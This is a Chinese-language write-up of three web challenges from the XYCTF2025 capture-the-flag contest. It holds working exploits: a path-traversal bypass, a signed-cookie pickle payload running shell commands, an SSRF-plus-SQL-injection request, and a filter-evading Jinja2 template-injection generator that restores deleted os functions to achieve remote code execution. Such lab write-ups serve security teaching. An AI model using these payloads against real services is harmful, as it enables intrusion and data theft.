---
title: XYCTF2025
date: 2025-04-07 20:59:19
tags:
categories: 比赛复现
---

### WEB

### Signin

我们审计代码

```py
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()
app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)



```

我们发现有个download和secret路由，在download里可以进行任意文件读取，但是过滤了`../../`和开头的../，因此我们可以插入./进行绕过

```
?filename=./.././../secret.txt

Hell0_H@cker_Y0u_A3r_Sm@r7
```

得到密钥

![image-20250409203533316](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504092035430.png)

接下来我们看到有一个secret路由，而在get_cookie中能继续pickle反序列化

```py
    def get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret:
            # See BaseResponse.set_cookie for details on signed cookies.
            if value and value.startswith('!') and '?' in value:
                sig, msg = map(tob, value[1:].split('?', 1))
                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()
                if _lscmp(sig, base64.b64encode(hash)):
                    dst = pickle.loads(base64.b64decode(msg))
                    if dst and dst[0] == key:
                        return dst[1]
            return default
        return value or default

```

只要签名对的上就能直接进行pickle反序列化

```rust
from bottle import cookie_encode
import os
import requests
secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Test:
    def __reduce__(self):
        return (eval, ("""__import__('os').system('cp /f* ./2.txt')""",))

exp = cookie_encode(
    ('session', {"name": [Test()]}),
    secret
)

requests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})


```

然后我们访问2.txt得到flag



### Fate（json反序列化和python格式化字符串）

```py
#!/usr/bin/env python3
import flask
import sqlite3
import requests
import string
import json
app = flask.Flask(__name__)
blacklist = string.ascii_letters
def binary_to_string(binary_string):
    if len(binary_string) % 8 != 0:
        raise ValueError("Binary string length must be a multiple of 8")
    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
    
    return string_output

@app.route('/proxy', methods=['GET'])
def nolettersproxy():
    url = flask.request.args.get('url')
    if not url:
        return flask.abort(400, 'No URL provided')
    
    target_url = "http://lamentxu.top" + url
    for i in blacklist:
        if i in url:
            return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~')
    if "." in url:
        return flask.abort(403, 'No ssrf allowed')
    response = requests.get(target_url)

    return flask.Response(response.content, response.status_code)
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    print(flask.request.remote_addr)
    return flask.render_template("index.html")

@app.route('/1337', methods=['GET'])
def api_search():
    if flask.request.remote_addr == '127.0.0.1':
        code = flask.request.args.get('0')
        if code == 'abcdefghi':
            req = flask.request.args.get('1')
            try:
                req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
            except:
                flask.abort(400, "Invalid JSON")
            if 'name' not in req:
                flask.abort(400, "Empty Person's name")

            name = req['name']
            if len(name) > 6:
                flask.abort(400, "Too long")
            if '\'' in name:
                flask.abort(400, "NO '")
            if ')' in name:
                flask.abort(400, "NO )")
            """
            Some waf hidden here ;)
            """

            fate = db_search(name)
            if fate is None:
                flask.abort(404, "No such Person")

            return {'Fate': fate}
        else:
            flask.abort(400, "Hello local, and hello hacker")
    else:
        flask.abort(403, "Only local access allowed")

if __name__ == '__main__':
    app.run(debug=True)

```

通过init_db.py我们可以知道。flag在LamentXU对应的值里。但是LamentXU的长度>6，因此不能查询

我们在api_search里发现一个明显的json.load()，并且也提示了使用json反序列化

首先我们来看SSRF部分、

1.在前面加入lamentxu.top，这个可以用@来绕过

2.禁止了所有字母和.，那么我们使用2130706433来表示127.0.0.1

3.必须要传入参数0为abcdef。我们使用二次URL编码绕过。

接下来就是sql注入部分了

我们知道，在python中，当我们使用f-string直接传入非字符串参数时，就会被强转为字符串。

如下：

![image-20250409215339849](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504092153984.png)

这也被称为python格式化字符串漏洞

在本题中限制了列表和元组，使用字典。

因此我们传入

```
{"name":{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}}
```

拼接后的sql语句为

```
SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}')))))))
```

即可成功注入

接下来将传入的数据编码

```
def string_to_binary(input_string):
    binary_list = [format(ord(char), '08b') for char in input_string]
    binary_string = ''.join(binary_list)
    return binary_string
print(string_to_binary("""{"name":{"'))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME='LAMENTXU' --":1}}"""))
```

然后我们直接打

```
GET /proxy?url=@2130706433:8080/1337?1=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101%260=%2561%2562%2563%2564%2565%2566%2567%2568%2569
```

![image-20250409215732965](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504092157010.png)



### Now you see me 1

```python
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2024/12/27 18:27:15
@Author  :   LamentXU 

运行，然后你会发现启动了一个flask服务。这是怎么做到的呢？
注：本题为彻底的白盒题，服务端代码与附件中的代码一模一样。不用怀疑附件的真实性。
'''
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")                                                            ;exec(__import__("base64").b64decode('IyBZT1UgRk9VTkQgTUUgOykKIyAtKi0gZW5jb2Rpbmc6IHV0Zi04IC0qLQonJycKQEZpbGUgICAgOiAgIHNyYy5weQpAVGltZSAgICA6ICAgMjAyNS8wMy8yOSAwMToxMDozNwpAQXV0aG9yICA6ICAgTGFtZW50WFUgCicnJwojIFNvbWV0aGluZyB0byBub3RlOiBJZiB5b3UgZ2V0IHRoZSBmaW5hbCAiZmxhZyIgYnV0IGl0cyBub3QgZXZlbiBhIHRleHQgZmlsZS4gcGxlYXNlIHRoaW5rIGFib3V0IHRoaXM6IAojIE1hZ2ljaWFucyBhbHdheXMgdXNlIHNvbWV0aGluZyB0byBoaWRlIHRoZWlyIHRydXRoLiAKJycnCllvdXIgZmluYWwgc2VjcmV0IGlzOiAoc29tZXRoaW5nIGhpZGRlbiBiZWxvdyB0aGlzIGxpbmUpCgoJICAgICAJICAgICAgCSAgICAgCgkgCSAgICAgCSAgCSAgIAkgICAgICAgCSAgICAgICAJIAkgICAgCSAgCiAgCSAgICAJCQkgCQkgICAgICAgCSAKJycnCmltcG9ydCBmbGFzawppbXBvcnQgc3lzCmVuYWJsZV9ob29rID0gIEZhbHNlCmNvdW50ZXIgPSAwCmRlZiBhdWRpdF9jaGVja2VyKGV2ZW50LGFyZ3MpOgogICAgZ2xvYmFsIGNvdW50ZXIKICAgIGlmIGVuYWJsZV9ob29rOgogICAgICAgIGlmIGV2ZW50IGluIFsiZXhlYyIsICJjb21waWxlIl06CiAgICAgICAgICAgIGNvdW50ZXIgKz0gMQogICAgICAgICAgICBpZiBjb3VudGVyID4gNDoKICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcihldmVudCkKCmxvY2tfd2l0aGluID0gWwogICAgImRlYnVnIiwgImZvcm0iLCAiYXJncyIsICJ2YWx1ZXMiLCAKICAgICJoZWFkZXJzIiwgImpzb24iLCAic3RyZWFtIiwgImVudmlyb24iLAogICAgImZpbGVzIiwgIm1ldGhvZCIsICJjb29raWVzIiwgImFwcGxpY2F0aW9uIiwgCiAgICAnZGF0YScsICd1cmwnICwnXCcnLCAnIicsIAogICAgImdldGF0dHIiLCAiXyIsICJ7eyIsICJ9fSIsIAogICAgIlsiLCAiXSIsICJcXCIsICIvIiwic2VsZiIsIAogICAgImxpcHN1bSIsICJjeWNsZXIiLCAiam9pbmVyIiwgIm5hbWVzcGFjZSIsIAogICAgImluaXQiLCAiZGlyIiwgImpvaW4iLCAiZGVjb2RlIiwgCiAgICAiYmF0Y2giLCAiZmlyc3QiLCAibGFzdCIgLCAKICAgICIgIiwiZGljdCIsImxpc3QiLCJnLiIsCiAgICAib3MiLCAic3VicHJvY2VzcyIsCiAgICAiZ3xhIiwgIkdMT0JBTFMiLCAibG93ZXIiLCAidXBwZXIiLAogICAgIkJVSUxUSU5TIiwgInNlbGVjdCIsICJXSE9BTUkiLCAicGF0aCIsCiAgICAib3MiLCAicG9wZW4iLCAiY2F0IiwgIm5sIiwgImFwcCIsICJzZXRhdHRyIiwgInRyYW5zbGF0ZSIsCiAgICAic29ydCIsICJiYXNlNjQiLCAiZW5jb2RlIiwgIlxcdSIsICJwb3AiLCAicmVmZXJlciIsCiAgICAiVGhlIGNsb3NlciB5b3Ugc2VlLCB0aGUgbGVzc2VyIHlvdSBmaW5kLiJdIAogICAgICAgICMgSSBoYXRlIGFsbCB0aGVzZS4KYXBwID0gZmxhc2suRmxhc2soX19uYW1lX18pCkBhcHAucm91dGUoJy8nKQpkZWYgaW5kZXgoKToKICAgIHJldHVybiAndHJ5IC9IM2RkZW5fcm91dGUnCkBhcHAucm91dGUoJy9IM2RkZW5fcm91dGUnKQpkZWYgcjNhbF9pbnMxZGVfdGgwdWdodCgpOgogICAgZ2xvYmFsIGVuYWJsZV9ob29rLCBjb3VudGVyCiAgICBuYW1lID0gZmxhc2sucmVxdWVzdC5hcmdzLmdldCgnTXlfaW5zMWRlX3cwcjFkJykKICAgIGlmIG5hbWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBuYW1lLnN0YXJ0c3dpdGgoIkZvbGxvdy15b3VyLWhlYXJ0LSIpOgogICAgICAgICAgICAgICAgZm9yIGkgaW4gbG9ja193aXRoaW46CiAgICAgICAgICAgICAgICAgICAgaWYgaSBpbiBuYW1lOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ05PUEUuJwogICAgICAgICAgICAgICAgZW5hYmxlX2hvb2sgPSBUcnVlCiAgICAgICAgICAgICAgICBhID0gZmxhc2sucmVuZGVyX3RlbXBsYXRlX3N0cmluZygneyMnK2Yne25hbWV9JysnI30nKQogICAgICAgICAgICAgICAgZW5hYmxlX2hvb2sgPSBGYWxzZQogICAgICAgICAgICAgICAgY291bnRlciA9IDAKICAgICAgICAgICAgICAgIHJldHVybiBhCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXR1cm4gJ015IGluc2lkZSB3b3JsZCBpcyBhbHdheXMgaGlkZGVuLicKICAgICAgICBleGNlcHQgUnVudGltZUVycm9yIGFzIGU6CiAgICAgICAgICAgIGNvdW50ZXIgPSAwCiAgICAgICAgICAgIHJldHVybiAnTk8uJwogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcmV0dXJuICdFcnJvcicKICAgIGVsc2U6CiAgICAgICAgcmV0dXJuICdXZWxjb21lIHRvIEhpZGRlbl9yb3V0ZSEnCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgaW1wb3J0IG9zCiAgICB0cnk6CiAgICAgICAgaW1wb3J0IF9wb3NpeHN1YnByb2Nlc3MKICAgICAgICBkZWwgX3Bvc2l4c3VicHJvY2Vzcy5mb3JrX2V4ZWMKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICBpbXBvcnQgc3VicHJvY2VzcwogICAgZGVsIG9zLnBvcGVuCiAgICBkZWwgb3Muc3lzdGVtCiAgICBkZWwgc3VicHJvY2Vzcy5Qb3BlbgogICAgZGVsIHN1YnByb2Nlc3MuY2FsbAogICAgZGVsIHN1YnByb2Nlc3MucnVuCiAgICBkZWwgc3VicHJvY2Vzcy5jaGVja19vdXRwdXQKICAgIGRlbCBzdWJwcm9jZXNzLmdldG91dHB1dAogICAgZGVsIHN1YnByb2Nlc3MuY2hlY2tfY2FsbAogICAgZGVsIHN1YnByb2Nlc3MuZ2V0c3RhdHVzb3V0cHV0CiAgICBkZWwgc3VicHJvY2Vzcy5QSVBFCiAgICBkZWwgc3VicHJvY2Vzcy5TVERPVVQKICAgIGRlbCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcgogICAgZGVsIHN1YnByb2Nlc3MuVGltZW91dEV4cGlyZWQKICAgIGRlbCBzdWJwcm9jZXNzLlN1YnByb2Nlc3NFcnJvcgogICAgc3lzLmFkZGF1ZGl0aG9vayhhdWRpdF9jaGVja2VyKQogICAgYXBwLnJ1bihkZWJ1Zz1GYWxzZSwgaG9zdD0nMC4wLjAuMCcsIHBvcnQ9NTAwMCkK'))                                                                 
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")                                                                 
print("Hello, world!")
print("Hello, world!")
print("Hello, world!")
#...

```

我们发现代码中间藏了一段代码，我们解码得到

```python
import sys
enable_hook =  False
counter = 0
def audit_checker(event,args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,'\'', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "The closer you see, the lesser you find."] 
        # I hate all these.
app = flask.Flask(__name__)
@app.route('/')
def index():
    return 'try /H3dden_route'
@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#'+f'{name}'+'#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.check_call
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)

```

#### ssti request对象

直接去看waf。先考虑传统继承链。但是由于缺少`_`，只能去尝试构造字符`_`，但是由于限制了单双引号和一些重要字符，无法获取到`_`。传统继承链打不了。

注意到没有过滤request对象(除了request其他入口类全给ban了)，然后可以发现request的常用逃逸参数(args,values这种)全被禁止。同时限制死了单双引号，无法拼接，无法进行编码转换。

我们在[·https://chenlvtang.top/2021/03/31/SSTI进阶](https://chenlvtang.top/2021/03/31/SSTI进阶/)里发现

![image-20250410193212141](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504101932302.png)

发现其中提到的参数全部被ban

因此，我们去找开发手册，我们能看到

![image-20250410193443570](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504101934627.png)

可以使用`request.endpoint`获取当前路由的函数名，即**r3al_ins1de_th0ught**

从中我们能获取字符'd'、'a'、't'

注意到可以拼接data，进而获取request.data，再在请求体中传入任意字符进行绕过，至此，我们可以获得任意字符



#### importlib.reload

我们可以看到题目删除了RCE的方法、python2中可以使用reload函数对类进行重载，在python3中，这个函数搬到了importlib类

，可以以此重载到被删除的方法

```py
import os
import importlib
del os.system
importlib.reload(os)
os.system('whoami')
```



#### audithook  

至于audithook是用来防奇怪的非预期的，不必在意。使用reload会触发一次complie和exec，再加上render_templete本身就有一次，一共正好4次。



#### flask模版注释语句闭合

我们知道在flask中{#和#}意味着注释语句。即在这里面的内容不会被渲染，也不会被执行

正常渲染的话我们的语句会被注释掉。因此需要在语句的开头加入`#}`来闭合注释语句。

poc

```
#}{%print(7*7)%}
```



#### 最终利用

到此，我们已经可以构造任意字符，同时也可以回复RCE类。我们依然使用requests作入口类，通过继承打RCE

总结如下:

1.`#}`闭合注释语句
		2.request.endpoint找request.data
		3.request.data从请求体中获取任意字符
		4.通过拼接字符打继承链找到importlib的reload。分别reload`os.popen`和`subprocess.Popen`
		5.通过request打继承链找os打RCE



利用脚本如下:

```py
# -*- encoding: utf-8 -*-
'''
@File    :   exploit.py
@Time    :   2025/01/27 17:46:11
@Author  :   LamentXU 
'''

import re
payload = []
def generate_rce_command(cmd):
    global payload
    payloadstr = "{%set%0asub=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('subprocess')%}{%set%0aso=request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(sub))%}{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('importlib')|attr('reload')(so))%}{%print(so|attr('popen')('" + cmd + "')|attr('read')())%}"

    required_encoding = re.findall('\'([a-z0-9_ /\.]+)\'', payloadstr)
    # print(required_encoding)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    # print(encoded_payloads)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    # print(fully_encoded_payload)
    payload.append(fully_encoded_payload)
command = "whoami"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
# Now we have "data"
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)
# payload.append(r'{%print(j)%}')
# Here we use the "data" to construct the payload
print('request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/')
# use chr() to convert the number to character
# hiahiahia~ Now we get all of the charset, SSTI go go go!


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)


```

可以看到成功RCE

![image-20250410195248341](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504101952416.png)

执行whoami的payload

```py
GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%for%0ai%0ain%0arequest.endpoint|slice(1)%}{%set%0adat=i.9~i.2~i.12~i.2%}{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}{%set%0aa0%0a=%0ak.16~k.31~k.31~k.27~k.24~k.18~k.16~k.35~k.24~k.30~k.29%}{%set%0aa1%0a=%0ak.2~k.2~k.22~k.27~k.30~k.17~k.16~k.27~k.34~k.2~k.2%}{%set%0aa2%0a=%0ak.2~k.2~k.22~k.20~k.35~k.24~k.35~k.20~k.28~k.2~k.2%}{%set%0aa3%0a=%0ak.2~k.2~k.17~k.36~k.24~k.27~k.35~k.24~k.29~k.34~k.2~k.2%}{%set%0aa4%0a=%0ak.2~k.2~k.24~k.28~k.31~k.30~k.33~k.35~k.2~k.2%}{%set%0aa5%0a=%0ak.34~k.36~k.17~k.31~k.33~k.30~k.18~k.20~k.34~k.34%}{%set%0aa6%0a=%0ak.30~k.34%}{%set%0aa7%0a=%0ak.24~k.28~k.31~k.30~k.33~k.35~k.27~k.24~k.17%}{%set%0aa8%0a=%0ak.33~k.20~k.27~k.30~k.16~k.19%}{%set%0aa9%0a=%0ak.31~k.30~k.31~k.20~k.29%}{%set%0aa10%0a=%0ak.38~k.23~k.30~k.16~k.28~k.24%}{%set%0aa11%0a=%0ak.33~k.20~k.16~k.19%}{%set%0asub=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a5)%}{%set%0aso=request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a6)%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(sub))%}{%print(request|attr(a0)|attr(a1)|attr(a2)(a3)|attr(a2)(a4)(a7)|attr(a8)(so))%}{%print(so|attr(a9)(a10)|attr(a11)())%}{%print(so|attr(a9)(a10)|attr(a11)())%}{%endfor%}{%endfor%} HTTP/1.1
Host: XXX
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 69

_ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/

```

下载服务器上的`/flag_h3r3`文件，可以发现是一个MP3音频。想到deepsound隐写。

![image-20250410195402276](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504101954366.png)

在txt文档中读取到flag

```
flag{N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!}
```

参考:https://www.cnblogs.com/LAMENTXU/articles/18730353
